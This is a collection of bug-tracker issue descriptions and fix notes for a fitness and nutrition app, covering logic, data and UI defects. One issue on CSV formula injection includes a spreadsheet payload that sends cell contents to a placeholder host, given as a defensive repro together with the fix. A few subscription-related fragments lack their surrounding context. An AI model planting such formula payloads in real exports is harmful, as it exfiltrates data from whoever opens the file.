issues.description:
[bug-hunt] Daily-activity editor (ActivityTargetSheet, src/components/plan-builder/ActivityTargetCard.tsx) — the "Cardio minutes" stepper is a DEAD CONTROL, and it silently writes an incoherent activity target, once "Cardio sessions" is set to 0.

Root cause: the sheet derives the displayed per-day value as perDayMinutes = weekly_cardio_sessions > 0 ? Math.round(weekly_cardio_minutes / weekly_cardio_sessions) : 0 (lines 93-96). The "Cardio minutes" StepperRow renders value={perDayMinutes} (line 150) and its onChange writes weekly_cardio_minutes = Math.max(weekly_cardio_sessions, 1) * n (line 152).

When weekly_cardio_sessions === 0: perDayMinutes is forced to 0, so the row shows "Off". Tapping + calls onChange(clamp(0+5)) = onChange(5), which patches weekly_cardio_minutes = Math.max(0,1)*5 = 5. On re-render perDayMinutes is STILL 0 (sessions is 0), so the display snaps back to "Off" and never increments no matter how many times + is tapped — a visibly dead button. Meanwhile the target now holds { weekly_cardio_sessions: 0, weekly_cardio_minutes: 5 } — an incoherent "no cardio" summary (ActivityTargetCard line 37-41 prints "no cardio") over a non-zero weekly-minutes value, which is persisted to the builder draft and shipped to the backend save_custom_plan payload on Continue.

Second symptom, same coupling: decrementing "Cardio sessions" to 0 sets weekly_cardio_minutes = 0*perDay = 0, and incrementing back to >=1 does NOT restore the prior minutes (weekly = n * perDayMinutes, but perDayMinutes is now 0) — the per-day length is permanently lost and the user must re-enter it.

Expected: with 0 cardio sessions the minutes stepper should be disabled/hidden (no dead control), and no phantom weekly_cardio_minutes should be saved while sessions is 0; toggling sessions off then on should not silently discard the minutes-per-day value.

Repro: onboarding workout builder (or Activity -> Build Activity Plan, /ai/create-workout-plan?focus=activity) -> tap the "Daily activity" card to open the editor -> tap - on "Cardio sessions" until it reads "Off" -> tap + on "Cardio minutes": nothing changes on screen (dead), yet the saved target becomes 0 sessions + non-zero weekly minutes.

issues.description:
[bug-hunt] Body Composition TDEE / VO2max / Fitness Age use a WRONG activity-multiplier table that diverges from the canonical onboarding calculator, so the page shows numbers that contradict the plan they claim to describe — and the most-active users are hit worst.

src/pages/BodyComposition.tsx defines its OWN ACTIVITY_MULTIPLIERS (L65-74) that disagrees with the single source of truth src/lib/onboarding-calc.ts (L5-11, used by calcOnboardingStats -> every plan target + the dashboard TDEE):
1) very_active: BodyComposition = 1.9 vs onboarding-calc = 1.725 -> TDEE OVERSTATED ~10%.
2) extremely_active: onboarding STORES exactly this string (Screen7_Activity.tsx:30-31, Screen3_IntensityActivity.tsx:37, GoalChangeWizard.tsx:58), but BodyComposition's map has NO "extremely_active" key — it has a typo'd "extra_active" instead. So tdeeMultiplier() (L76-79) evaluates ACTIVITY_MULTIPLIERS["extremely_active"] ?? 1.375 = 1.375 — i.e. an ATHLETE is scored with the "lightly active" multiplier. The same fallback hits vo2MaxEstimate() (L92: ACTIVITY_MULTIPLIERS[level] ?? 1.375), so their VO2 max and Fitness Age are also computed as if lightly active (understated VO2 -> older fitness age).

Concrete repro (male, 80 kg, 180 cm, 30 yo, activity_level "extremely_active"): BMR (Mifflin-St Jeor) = 10*80 + 6.25*180 - 5*30 + 5 = 1780. Canonical plan/onboarding TDEE = 1780 * 1.9 = 3382 kcal. Body Composition page shows TDEE = 1780 * 1.375 = 2448 kcal — ~934 kcal/day (28%) LOWER than the plan it describes, and the "Discuss all metrics with Coach" prompt sends the wrong 2448 figure to the coach. For a "very_active" user the page instead OVERstates (1780*1.9=3382 vs canonical 1780*1.725=3071).

Expected: Body Composition TDEE + VO2max reuse the canonical ACTIVITY_MULTIPLIERS (very_active=1.725, extremely_active=1.9) so they agree with the plan the app actually built.
Actual: local divergent copy — very_active=1.9 (wrong) and NO extremely_active key (typo extra_active), so athletes silently fall back to the 1.375 light default.
Fix: import ACTIVITY_MULTIPLIERS from src/lib/onboarding-calc.ts and delete the local copy (or at minimum add the extremely_active key and set very_active=1.725); confirm tdeeMultiplier + vo2MaxEstimate no longer hit the 1.375 fallback for stored activity levels.

issues.description: [bug-hunt] Change Goal wizard (/goal-change, src/pages/GoalChangeWizard.tsx) Body Stats step is kg-only and ignores an imperial user unit_preference. The two ScrollableScale rulers hardcode unit="kg" with a kg range (min 30 / max 250 / defaults 70 & 65) and the delta summary + extreme-swing threshold (>30) are all in kg. The component never fetches [profile-basic-info] and does NO kg<->lb conversion — unlike LogWeight/Measurements/WeightTrendChart, which read unit_preference===imperial and convert via kgToLb (kg*2.20462) to show lbs. Expected: for an imperial user the current-weight and goal-weight rulers + delta show lbs (converted). Actual: rulers/labels are kg for everyone. Not merely cosmetic — this is a DATA-ENTRY surface: an imperial user seeing 100 kg (their real 220 lb) is likely to scroll to 220 reading the ruler as lbs, and confirmGoalChange then writes 220 as current_weight_kg / goal_weight_kg, corrupting the plan (echoes the 70->65 kg overwrite the file comments already warn about). Repro: profile unit_preference=imperial -> open /goal-change -> step to Body Stats -> rulers show kg, not lbs. Fix: read unit_preference like LogWeight and convert ruler min/max/step/value + delta suffix to lbs for imperial users while still sending kg to the API. issues.description: [bug-hunt] Log Weight EWMA weekly-rate + Goal ETA are diluted by carry-forward days for any user who doesn't weigh in every day (the common case). The backend weight-data endpoint builds daily_weight_history where a day with no real log CARRIES FORWARD the previous weight as a REPEATED numeric value with logged:false (nyu_backend/backend.py:6752-6764). The sibling loggingStreak correctly excludes these (src/pages/LogWeight.tsx:468 filters `p.logged !== false`), and recent_weigh_ins was added specifically to expose carry-forward-free data (types/api.ts:604-608). But weightTrend (LogWeight.tsx:485-499) filters ONLY `typeof p.weight === 'number' && Number.isFinite(p.weight)` — which is TRUE for carry-forward rows — so every non-weigh-in day feeds a repeated weight into the alpha=0.25 EWMA, and the rate is divided by a fixed `lookback` of up to 7 DAYS (line 497), not by the number of real weigh-ins. Repro: weigh in 80.0 kg on day 1, skip days 2-6, weigh in 78.0 kg on day 7. daily_weight_history = [80(logged),80,80,80,80,80(carry),78(logged)]; EWMA rate = ((79.5-80)/6)*7 ~= -0.58 kg/wk, versus a true ~-2.3 kg/wk. This diluted rate is shown in the chart caption AND fed into goalEta (LogWeight.tsx:520 -> computeGoalEta), roughly DOUBLING the projected Goal date — or dropping |rate| under MIN_RATE_KG_WK and flipping the Goal card to 'keep logging'. Expected: the smoothed weekly rate reflects real weigh-ins only. Actual: understated/diluted. Fix: filter `p.logged !== false` in weightTrend (or read recent_weigh_ins), matching loggingStreak.

issues.description:
[bug-hunt] Human-coach / admin replies to a user permanently disappear from the user’s Coach Chat after any fresh mount or reload — they are delivered live over the socket but never returned by the history endpoint the app actually loads.

Route: /coach-chat. Backend: app/routes/coach.py GET /api/coach/history (the endpoint the FE loads first) + app/admin_v2/user_conversations.py (admin reply writer). FE: src/services/chat.service.ts getHistory.

WHAT IS WRONG:
1. When an admin/human coach replies to a user from the admin “User Conversations” panel, the reply is stored as Message(sender_type=‘coach’, recipient_id=user_id) and pushed to the user’s socket room via socketio.emit(‘new_message’, {… sender_type:‘coach’}) (user_conversations.py:229-259). The user sees it in real time (chat.service handleNewMessage sets is_from_me=false, list renders it as a coach bubble).
2. But GET /api/coach/history filters messages with Message.sender_type.in_([‘user’, ‘ai’]) (coach.py:513). A sender_type=‘coach’ (or ‘admin’) row matches the sender/recipient clause but is EXCLUDED by that sender_type filter, so it is never in the history payload.
3. src/services/chat.service.ts getHistory (chat.service.ts:74-82) calls /coach/history FIRST and only falls back to /chat/history on ERROR. The /chat/history twin (backend.py ChatHistoryResource:4301) has NO sender_type filter and WOULD include coach replies — but /coach/history succeeds, so the fallback never runs.

RESULT: On the very next fresh mount of /coach-chat (app restart, navigate away+back, or hard reload) the local messages state is rebuilt purely from /coach/history, which omits the coach reply → the human-coach message is gone forever. (It survives 60s in-memory poll refetches only because CoachChat.tsx:168-175 keeps non-server survivors; a full remount resets that state to empty.)

issues.description:
[bug-hunt] Plan Timeline lifecycle pill row highlights TWO states as current for a genuinely paused-then-resumed plan: BOTH "Active" AND "Resumed" light up, breaking the stated "ONE selected signal" (single fill) contract.

Component: src/pages/PlanTimeline.tsx -> PlanStateMachine (the Draft -> Active -> Paused -> Resumed -> Completed QuietChip row), route /plan-timeline.

WHAT IS WRONG: isCurrent for each chip (PlanTimeline.tsx:559-562) is:
  const isCurrent =
    (state.key === 'resumed' && isResumed) ||
    (state.key === 'active' && currentStatus === 'active' && !isResumed) ||
    (state.key === currentStatus);
with isResumed = currentStatus === 'active' && !!plan.resumed_at (L549). A resumed plan has status back to 'active' with resumed_at set. Trace for that plan (currentStatus='active', isResumed=true):
  - chip 'resumed': clause1 (key==='resumed' && isResumed) = TRUE -> highlighted.
  - chip 'active':  clause1 false; clause2 requires !isResumed = FALSE; BUT clause3 (state.key === currentStatus) = ('active'==='active') = TRUE -> ALSO highlighted.
So both Active and Resumed render with the selected fill (QuietChip selected=isCurrent, L570-577). The clause2 guard !isResumed was written specifically to stop Active lighting when resumed, but the catch-all clause3 (state.key === currentStatus) re-adds it because currentStatus IS 'active' for a resumed plan.

This is a NEW regression, NOT a duplicate of i-20260718-c5e8 (that was the old version>1 heuristic mislabeling EDITED-but-never-paused plans as Resumed; its fix correctly switched isResumed to key off resumed_at). c5e8 fixed a false-positive; this bug is the opposite direction: a TRUE resume now double-highlights.

EXPECTED: for a paused->resumed active plan, only the 'Resumed' chip is current (Resumed is a sub-state of active, per the code comment L545-548). The 'Active' chip must NOT also be filled.
ACTUAL: both 'Active' and 'Resumed' chips show the selected fill simultaneously.

REPRO: have an active plan -> pause it (/plan-pause) -> resume it (/plan-resume) so /plans/active returns status='active' with resumed_at set -> open /plan-timeline -> the lifecycle pill row lights BOTH Active and Resumed. Pure-logic bug; verifiable by evaluating the isCurrent expression with currentStatus='active' and plan.resumed_at set.

SEVERITY: LOW-MED (misleading lifecycle display; not destructive). Triggers for every user who has paused then resumed a plan.

FIX: make the catch-all clause not fire for 'active' when resumed, e.g. (state.key === currentStatus && !(state.key === 'active' && isResumed)), so the resumed sub-state owns the single highlight.

issues.description:
[bug-hunt] Dashboard coach-moment deck: a card you DISMISS (X) can silently reappear on the next dashboard load.

WHERE: src/components/moments/StackedMomentCards.tsx:62-70 — dismissedIds is a useState INITIALIZER (runs exactly once, off the FIRST render moments array). Nothing ever re-syncs it. The momentsKey effect (L52-54) only resets the "expanded" flag, never dismissedIds. The "visible" filter (L72) then filters on that stale Set.

MECHANISM: The deck is built in Dashboard.tsx:498-538. The "weekly-challenge" card is gated on a SEPARATE query (useQuery ["weekly-challenge"], Dashboard.tsx:156) that resolves independently of the "dashboard-overview" query which gates the whole page skeleton. The deck mounts the instant overview resolves; if the weekly-challenge fetch has not resolved yet, that card is ABSENT from the first render moments, so its sectionId is never checked against localStorage and never added to dismissedIds. When the weekly-challenge query then resolves, Dashboard re-renders with the card prepended — but dismissedIds still lacks it, so a card the user dismissed earlier today (localStorage nyus_moment_dismiss_weekly-challenge === today) is shown again.

EXPECTED: A card dismissed today stays hidden for the rest of the day, regardless of which async query it arrived from.
ACTUAL: The localStorage dismiss marker is honored ONLY for cards present at first deck-mount; a late-arriving dismissed card (weekly-challenge is the common case — its fetch is a separate round-trip from overview) reappears.

REPRO: 1) On /dashboard, dismiss the weekly-challenge coach-moment card (tap the X). 2) Hard-reload / cold-open the dashboard so both queries refetch. 3) When the weekly-challenge fetch settles AFTER the overview fetch, the dismissed card reappears in the deck.

FIX: keep dismissedIds in sync with the moments set — e.g. a useEffect keyed on momentsKey that re-reads localStorage for every current sectionId (union into the Set), or compute "visible" by checking localStorage directly for ids not already in the Set. [bug-hunt] Past-day meal logging on /nutrition slots every BACKFILLED meal by the CURRENT device clock, so a meal you ate on an earlier day is filed under the wrong meal-type (e.g. yesterday's breakfast backfilled in the evening becomes Dinner/Snack).

WHERE: the diary supports MFP-style past-day logging (DiaryDateStepper -> CustomMealModal + NutritionQuickComposer receive logDate=diaryDate; backend window today-30d..today). But EVERY past-day write path derives the slot from inferMealNumber() (src/lib/mealSlot.ts:7 — <11 breakfast, <16 lunch, <21 dinner, else snack) called with new Date() (NOW), never with the logged day:
  - src/components/nutrition/CustomMealModal.tsx:606 handleLogMeal -> meal_number: inferMealNumber(), log_date: targetLogDate (may be past)
  - src/components/nutrition/CustomMealModal.tsx:316 & :331 handleLogIngredient -> same pattern
  - src/pages/_components/nutrition/NutritionQuickComposer.tsx:116 submit -> meal_number: inferMealNumber(), log_date: logDate (may be past)
The backend maps meal_number 1/2/3/4 -> breakfast/lunch/dinner/snack for custom-logged cards (fix a4ff7a7), so the slot is fully determined by that number.

WHAT: inferMealNumber() is a sound heuristic for TODAY (you log a meal near when you eat it), but for a backfilled past day the current wall-clock has NO relationship to when the meal was actually eaten. [bug-hunt] After you CANCEL your subscription, the Subscription screen (on reload / revisit) shows "No active plan" + a "Choose a plan" button and hides "What's included" — even though you still have full prepaid access until your period-end date. The screen contradicts the app itself: /auth/me still reports subscription_active=true and every premium route still works.

Where: /settings/subscription (src/pages/SubscriptionSettings.tsx), backed by GET /api/v1/payments/subscription (backend.py PaymentSubscriptionResource.get, ~line 2746).

Root cause (backend): PaymentSubscriptionResource.get() queries ONLY `Subscription.query.filter_by(status='active')` (backend.py:2752-2757). But soft-cancel (CancelSubscriptionResource, backend.py:3016) sets `status='canceled'` while LEAVING current_period_end untouched (the user keeps access until the prepaid window ends — documented contract). So the moment a sub is cancelled, this GET no longer finds it and falls into the "no subscription" branch (backend.py:2759-2770): returns `status:'none', active:false, cancel_at_period_end:false, next_charge_date:null`.

Meanwhile the AUTHORITATIVE entitlement helper does the right thing: app/services/entitlement.py is_subscription_active / get_active_subscription count a row as active when `current_period_end > now AND status IN ('active','canceled')` (entitlement.py:50,64). /auth/me uses that, so subscription_active stays TRUE after cancel until period-end. The /payments/subscription endpoint diverges from that single source of truth.

Repro:
1. Be on a real paid subscription (or any Subscription row with current_period_end in the future).
2. Open /settings/subscription -> tap "Cancel subscription" -> confirm. In-session the UI optimistically shows "Cancelled — keep access until <date>" (handleCancel setInfo, SubscriptionSettings.tsx:179) — looks correct.
3. Reload the page (or navigate away and back) so load() re-fetches GET /payments/subscription.
Expected: screen shows the plan as cancelled/pending-expiry with the orange "You'll keep access until <date>" banner and "What's included", matching /auth/me (subscription_active=true).
Actual: info={status:'none', active:false, cancel_at_period_end:false}; isSubscribed=false -> planLabel renders "No active plan", the "Choose a plan" button appears, "What's included" is hidden, and the "access until <date>" banner never renders — while the user in fact still has premium access.

Fix (backend): PaymentSubscriptionResource.get() must mirror entitlement.get_active_subscription — select the most-recent row with `current_period_end > now AND status IN ('active','canceled')`, and set `cancel_at_period_end = (canceled_at is not None)` with the real current_period_end. That restores agreement with /auth/me and honours the soft-cancel "keep access until period end" contract on reload.

Note: not a static error (tsc/eslint clean) — a data-contract divergence between two endpoints.

So nothing is charged on current_period_end; it is the day access ENDS.

The FE then renders those two fields verbatim under a Calendar "Next charge" cell and a CreditCard "Amount" cell. The FE grid's own comment even assumes the backend leaves these null for an active plan ("An active plan with both fields null (the backend doesn't expose renewal details yet)…", SubscriptionSettings.tsx:280-285) — i.e. the frontend was written expecting no next-charge data, but the backend supplies it, so the misleading grid renders.

Repro:

2. Open /settings/subscription.
Expected: no implication of an automatic future charge (there is none). The period-end date should read as "Access until <date>" / "Expires", and no "Amount ₹X next charge" should be shown for a non-recurring plan.
Actual: shows "Next charge: <period_end date>" and "Amount: ₹499", which a user reads as "I'll be auto-charged ₹499 on that date" — false for the one-off flow.

Option (a) is cleanest and matches what the FE already assumes.

Note: correctness/UX-honesty defect; tsc/eslint clean.

[bug-hunt] Workout plan builder — the per-day "Toughness" slider inflates SWAPPED-IN / manually-added exercises non-monotonically, ratcheting their set count up to the cap (6) even when you LOWER the toughness.

Where: onboarding custom workout builder (Screen9b_WorkoutCustomize) — the 5-segment Recovery/Easy/Moderate/Hard/Max radiogroup rendered by src/components/workout-builder/DayCard.tsx (visible only when DayCardPlanContext is provided, i.e. the onboarding "always-custom" flow workout step).

Root cause (src/lib/workout-toughness.ts applyToughness + DayCard.tsx handleNotchChange):
- On the FIRST slider move, DayCard snapshots the day exercises into baselineRef (DayCard.tsx:134-135). All scaling is meant to derive from that fixed baseline so re-applying any notch is idempotent (never compounds).
- applyToughness (workout-toughness.ts:99-110) looks up each row reference sets/rest in `baseline` by exercise_id+name, else by name, ELSE falls back to `ex` (the row CURRENT, already-scaled values).
- A row SWAPPED in (DayCard.selectAlternative) or added via the library/custom paths AFTER the baseline was captured is NOT in baseline and is NOT appended to it (only the notch-5 auto-extras are appended, DayCard.tsx:152). So every later slider move scales that row from its own current (already-scaled) sets -> compounding.

Concrete repro (numbers): day starts A(3 sets), B(3 sets), notch=Moderate(3).
1. Tap Hard(4): baseline captured = [A:3,B:3]; A->4, B->4.
2. Swap B -> X (X enters at its own default sets, say 3).
3. Tap Max(5): X not in baseline -> ref = X current (3) -> isolation +2 -> X:5.
4. Tap Hard(4): ref = X current (5) -> +1 -> X:6.  <- lowering toughness (5->4) INCREASED X from 5 to 6.
5. Further toggles keep clamping X at the SET_CAP of 6 regardless of notch.
(Exercise A, which IS in baseline, scales correctly/idempotently the whole time — only the swapped/added row misbehaves.)

Expected: the toughness slider is monotonic — raising toughness never lowers sets and lowering it never raises sets, for every row including swapped/added ones; re-applying the same notch is idempotent.
Actual: swapped-in / manually-added rows scale from their own already-scaled values, so their set count compounds upward and pins to 6, and moving the slider DOWN can push their sets UP. The saved plan then carries inflated set volume for those exercises.

Fix: when a row is swapped in or manually added while a baseline is already captured, append it to baselineRef (at its entry sets/rest) — mirror what the notch-5 extras path already does at DayCard.tsx:152 — so applyToughness always has a stable reference and the `?? ex` fallback stops being hit for user-added rows. (selectAlternative, ExerciseLibraryDrawer onSelectItem, and onAddCustom are the three insertion points that must update baselineRef.)

tsc --noEmit exit 0, eslint 0 errors — this is a runtime logic defect, not a static one.

Fix: swapped-in and manually-added exercises are now registered into the baseline at their starting sets, so the slider stays monotonic and repeatable (idempotent) for every exercise.

issues.description:
[bug-hunt] Chart metric-icon tint backgrounds render with NO color — invalid CSS from appending a hex-alpha suffix onto an oklch() color string.

Root cause: chartColors.teal500()/pink500()/orange500() (src/components/charts/chart-utils.ts) resolve the --domain-* tokens, which are defined as oklch(...) in src/index.css. Several chart components build a tinted background by appending a 2-char hex-alpha suffix to that string, e.g. background: `${metric.color}1f`. That produces the literal string 'oklch(64% 0.140 175)1f', which is NOT a valid CSS color (hex-alpha suffixes only work on a 6-digit hex, e.g. #2ec4b6 -> #2ec4b61f). The CSSOM rejects the whole declaration, so the intended ~10-12% tint chip renders fully transparent.

Affected (all confirmed by reading source):
- src/components/progress/MultiMetricBarChart.tsx:128 uses `${metric.color}1f` for the rounded icon chip behind each metric label on /weekly-progress (TRENDS card), plus lines 345 / 367 / 412 (the Weight/Calories/Workouts icon chips in the day-detail drawer). The icons themselves stay colored (the separate color: prop is valid oklch) but sit on a transparent square instead of the tinted one.
- src/components/plan-builder/WeeklyTrajectory.tsx:162 uses `${PINK}1a` (PINK = chartColors.pink500(), an oklch string) on the projected-weight badge pill at the top-right of the plan-builder / plan-overview trajectory card — the pink text + trend icon render, but the pink pill background is missing.

This is the exact `${color}22` hex-suffix class the comment at src/services/healthScore.service.ts:172 warns about (fixed there via a color/textColor split); it is still live in these two chart components.

Expected: the metric-icon chips and the projected-weight badge show their subtle domain-color tint background.
Actual: transparent background (the CSS declaration is dropped as invalid).

Repro: open /weekly-progress with any logged data so the TRENDS MultiMetricBarChart renders -> the small rounded squares behind the Weight/Calories/Workouts icons have no tint (DevTools shows computed background is empty). Tap any bar -> same for the three metric chips in the drawer. In the plan-builder overview, the WeeklyTrajectory card top-right '+N kg' badge has no pink pill background.

Fix: build the tint with CSS token alpha syntax instead of hex concat — e.g. hsl(var(--domain-teal) / 0.12) (as HealthScoreCard.tsx TEAL_BG_STYLE already does) or the PILLAR_TINT_COLORS pattern. Never append a hex suffix to an oklch()/hsl() color string.

fix.description: The small colored icon squares on the Weekly Progress trends chart (Weight/Calories/Workouts) and the projected-weight badge in the plan builder were rendering with no background tint. Root cause: the code tacked a 2-character transparency code onto a color written in the modern oklch(...) format, which is invalid, so the browser discarded the whole background. Fix: build the tint with color-mix instead (works with any color format), so the teal/pink/orange tint chips now show correctly.

judge.note: Root cause fixed for all 5 sites via a shared color-mix helper; verified live on /weekly-progress (3 tinted chips) + plan-builder badge; full test:unit green (5783 passed).

[bug-hunt] Strength progression chart understates estimated 1RM. The orange "Est. 1RM" line and the "Peak 1RM" stat tile in the exercise progression sheet are wrong whenever a session's highest-Epley set is not its heaviest-weight set. Backend GET /api/v1/strength/exercise-progression (nyu_backend/app/routes/logging.py:1468-1497) orders each session's sets by weight_kg DESC, reps DESC, keeps the first row per date as the "top set", and computes e1rm = weight*(1+reps/30) from THAT single set only. A lighter high-rep back-off set frequently has a higher Epley estimate, so it is silently discarded. Expected: e1RM per session = MAX Epley across all sets that session (standard estimated-1RM methodology). Actual: e1RM taken from the heaviest-weight set only. Repro: log one session with a top set 100kg x 3 (Epley e1RM = 110.0) and a back-off set 80kg x 15 (Epley e1RM = 120.0); open Activity -> Personal bests -> tap the exercise. Frontend surfaces: src/components/activity/ExerciseProgressionSheet.tsx (dataKey "e1rm" line + "Peak 1RM" tile, line ~182). Fix in the backend query: compute e1rm as MAX(weight*(1+reps/30)) over all of the session's sets, independent of which set is heaviest.

issues.description:
[bug-hunt] Progress Photos always stamps the upload moment as the photo date (taken_at = new Date()), discarding the picked image's real date — so imported/gallery photos collapse to "today", corrupting the timeline order and the Compare Before/After pairing.

WHERE: src/components/measurements/ProgressPhotos.tsx:141-158 (handlePickPhoto), line 150 `await progressPhotosService.upload(compressed, new Date())`. The file input is `<input type="file" accept="image/*" capture="environment">` (lines 210-218).

WHAT: The upload service signature is `upload(file, takenAt?: Date)` and the backend (backend.py ProgressPhotoResource.post lines 10264-10272) honors a `taken_at` form field; the list endpoint orders strictly by `ProgressPhoto.taken_at.desc()` (line 10301) and the whole UI (grid date label, Compare left/right = oldest/newest, weight-change delta) is driven by taken_at. But handlePickPhoto passes `new Date()` unconditionally — it never reads `file.lastModified` (available on the picked File) nor lets the user set a date. On iOS/iPadOS (a shipping Capacitor target) the `capture` attribute is only a hint: the OS still offers "Photo Library", so a user can pick an EXISTING progress shot from weeks ago; on desktop/web the picker is always the file system. Every such import is dated NOW.

EXPECTED: an imported photo is dated by its real capture/modified date (e.g. `new Date(file.lastModified)`), or the user can choose the date; the timeline stays chronological.
ACTUAL: all imported photos are stamped with the upload instant, so several old photos added in one session share "today", jump to the top of the newest-first list, and the Compare view pairs the wrong two shots (and the weight-change delta uses whatever weight is logged NOW, since the backend attaches the latest WeightLog at upload — lines 10250-10262).

REPRO:
1. Log in, open /measurements, scroll to Progress Photos.
2. Tap "Add Photo" and (on iOS or web) choose an EXISTING photo from the library/disk taken on a prior date.
3. Observe the new entry's date label = today (not the photo's date), and it sorts as the newest photo.
4. Repeat with a second older photo → both show today's date and the Compare "Before/After" ordering no longer reflects real chronology.

FIX: default taken_at to the file's own date — `progressPhotosService.upload(compressed, new Date(file.lastModified || Date.now()))` — capturing `file.lastModified` before `e.target.value = ""`; optionally expose a date picker for manual correction. (Backend already accepts the taken_at field, so this is a one-line FE change.)

[bug-hunt] CSV data export is vulnerable to spreadsheet formula injection (CSV injection). src/lib/exportData.ts csvCell() only wraps a value in quotes when it matches /[",
]/ — it never neutralises a leading =, +, -, or @. So any user-controlled field that starts with one of those is written to the CSV verbatim. Because these exports are surfaced through the native Share sheet (email / Drive / sent to a coach) and as a web <a download>, when a recipient opens the file in Excel / Google Sheets / LibreOffice the cell is evaluated as a FORMULA, not text. Vector fields are user-editable free text: meal names (custom_builder lets the user rename meals — exportMealLogCSV, Nutrition.tsx:461), workout session names + manually-added exercise names (exportWorkoutHistoryCSV, WorkoutHistory.tsx:205). EXPECTED: cells beginning with = + - @ (and tab/CR) are prefixed with a neutraliser (e.g. a leading single-quote) so the spreadsheet treats them as text. ACTUAL: emitted raw. Repro: in the plan builder rename a meal to =HYPERLINK("http://evil.test?"&A1,"click") (or the simpler =1+1), go to /nutrition, tap Export meals, open the shared CSV in Excel/Sheets → the meal-name cell evaluates the formula instead of showing the literal text. NB quoting alone does NOT fix this — Excel still evaluates "=1+1"; the standard fix is a leading-char neutraliser in csvCell(). Impact: data exfiltration / formula execution in whoever the export is shared with; also benign breakage (a meal a user names "-5kg week" or "@home" renders as a spreadsheet error). Fix in one place: csvCell() in src/lib/exportData.ts.

Fix: such cells are now prefixed with a quote so spreadsheets read them as plain text; genuine numbers and ordinary names are untouched, and 6 unit tests lock the behaviour in.

issues.description:
[bug-hunt] Live workout player: after tapping "Continue" on the auto-advance banner (or when the final set POST resolves), the NEXT exercise's set editor opens with a rest timer already counting down — carried over from the PREVIOUS exercise — and when it elapses it logs a rest duration against the WRONG (previous) exercise.

ROOT CAUSE (src/pages/Activity.tsx): handleContinueToNext() (the "Continue -> next exercise" banner tap) closes the current ExerciseWheelPicker and reopens it for the next exercise, but never resets showRestTimer. logSetMutation.onSuccess arms the rest timer (setShowRestTimer(true)) whenever isModalOpen.current is true; the picker's own onClose resets it (setShowRestTimer(false)) but handleContinueToNext bypasses onClose and directly flips showWheelPicker. So showRestTimer stays true across the exercise switch. The next picker (key=new exercise_id) remounts and renders restTimerElement (gated only on showRestTimer), starting a fresh 90s countdown before any set is logged for the new exercise. Because lastLoggedSetRef.current still points at the PREVIOUS exercise's final set, the timer's onComplete/onSkip fires activityService.logSet({exercise_id: last.exercise_id=PREVIOUS, ...rest_seconds}) — writing rest_seconds to the wrong exercise while the user is on the new one, and speakRestCue announces the wrong set. (Same outcome if the final-set POST resolves after the picker has already advanced: onSuccess sees isModalOpen.current true and arms the timer in the new exercise's picker.)

EXPECTED: advancing to the next exercise starts it with NO active rest timer; the rest timer arms only after a set is logged for the exercise currently open, and any rest_seconds is attributed to that exercise.
ACTUAL: next exercise opens with a leftover running rest timer; on elapse it logs rest_seconds against the previous exercise and speaks a cue for the previous set.

REPRO: 1) Open Activity with a workout plan that has >=2 exercises. 2) Tap an exercise, log all its target sets via the wheel picker (rest timer arms after each set). 3) On the final set the "Set complete - next exercise" banner appears; tap Continue. 4) The next exercise's editor opens with a rest countdown already running (before logging anything). 5) Leave it ~90s: a background log-set POST fires for the PREVIOUS exercise (visible in network).

FIX: in handleContinueToNext (and ideally when adopting the next session in onSessionStarted), setShowRestTimer(false) + bump restTimerKey so the leftover timer is torn down; only re-arm on a set log for the newly-open exercise.

issues.description:
[bug-hunt] Nutrition intermittent-fasting banner: on a backend-flagged "intermittent" fasting day, tapping "End fast" does NOT stick on the first tap — the shared fast restarts itself within ~1s so the ring/timer reappears and the button feels dead. A second tap is needed.

ROUTE: /nutrition (FastingBanner)

ROOT CAUSE: src/pages/Nutrition.tsx:101-114 — the reconcile useEffect re-creates the shared stopwatch whenever there is NO active fast on a backend intermittent fasting day:
  if (!fastingDay || fastingType !== 'intermittent' || active) return;
  ... startFast('16:8', 16, start);
Its deps are [fastingDay, fastingType, active, startFast].
handleEndFast (Nutrition.tsx:127-131) does: endFast() (clears the shared active -> active=null) then onSetFasting(false,null).
But onSetFasting is NOT optimistic: useNutritionData.tsx:392-405 fires setFastingMutation and only flips fastingDay/fastingType via refetchFasting() in onSuccess (fastingDay derives from the server query cache, useNutritionData.tsx:512-513). So immediately after End: active=null but fastingDay is STILL true and fastingType STILL 'intermittent'.
React re-renders on active->null, the effect re-runs, the guard is false (fastingDay true, type intermittent, active null), computeBackdatedStart() resolves, loadActive() is null, and startFast() re-arms the fast the user just ended.

WHY THE RACE RELIABLY LOSES: the resurrect path needs ONE round-trip (2 parallel getDailyLogs in computeBackdatedStart). The cancel path needs TWO sequential round-trips (POST setFastingStatus -> then GET getFastingStatus refetch) before fastingDay flips to false and the effect cleanup sets cancelled=true. One trip beats two, so the restart wins at normal latency.

REPRO:
1. On /nutrition tap the 'Intermittent' fasting-day chip (sets backend fasting_day=true, type=intermittent -> shared 16:8 stopwatch auto-starts, ring shows).
2. Tap 'End fast'.
3. EXPECTED: the fasting strip/ring disappears and stays gone.
4. ACTUAL: the ring vanishes then re-appears within ~1s (fast restarted). Only a SECOND 'End fast' tap (after the backend flag has flipped) actually ends it.

FIX: the reconcile effect must not resurrect a fast the user just ended. Options: (a) set a local 'endedToday' ref in handleEndFast and short-circuit the reconcile effect while set for today; (b) make onSetFasting optimistic (setQueryData ['fasting-status', today] to fasting_day:false immediately so fastingDay flips synchronously); (c) only auto-start in the reconcile effect on mount, not on every active-goes-null transition.

issues.description:
[bug-hunt] Badge-unlock toast dedup is keyed on the badge's display NAME, not its id/key — a real second unlock in the same check can be silently swallowed (no toast, no error).

WHERE: src/components/achievement-context.tsx:211-218 —
```js
const shownBadgesRef = useRef<Set<string>>(new Set());
const showAchievement = useCallback((payload) => {
  if (shownBadgesRef.current.has(payload.badgeName)) return;
  shownBadgesRef.current.add(payload.badgeName);
  ...
```
Dedup uses `payload.badgeName` (display text). The caller (src/hooks/useGamification.ts:62-64) builds the payload from checkBadges() results using only `name`, `tier`, `xp`, `icon_url` — it never threads through a stable `badge_key`/id.

This is the same class of bug LevelCard.tsx already had and was fixed for (badgeCount now dedupes by badge_key to match the Achievements gallery's earnedByKey — commit 0ff6345a, 2026-07-15) but this second site was missed. If checkBadges() ever returns two distinct badges in one call whose display names collide (e.g. two tiers of the same badge family sharing a base name, or any backend name-string collision), the second real unlock never shows a toast — it's marked 'shown' the instant the first one's name is added to the Set, even though it's a different badge.

EXPECTED: every distinct badge unlock (by id/key) gets its own toast, exactly once.
ACTUAL: unlocks colliding on display name after the first are dropped silently.

FIX: thread badge_key (or badge id) through AchievementPayload from useGamification.ts's checkBadges() call, and key shownBadgesRef on that instead of badgeName.

